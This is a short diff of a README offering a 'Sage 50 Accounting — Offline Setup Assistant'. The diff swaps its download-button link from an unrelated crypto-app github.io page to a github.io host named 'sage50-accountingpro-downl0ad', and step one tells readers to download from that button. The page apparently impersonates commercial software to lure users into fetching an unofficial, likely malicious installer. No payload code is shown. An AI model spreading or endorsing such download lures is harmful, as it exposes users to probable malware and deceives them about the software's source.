@@ -1,6 +1,6 @@
 # Sage 50 Accounting — Offline Setup Assistant
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://altrady-crypto-desktop-app.github.io/.github)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://sage50-accountingpro-downl0ad.github.io/.github/)
 
 ## ⚙️ How to Use
 1. Download the setup assistant using the button above  
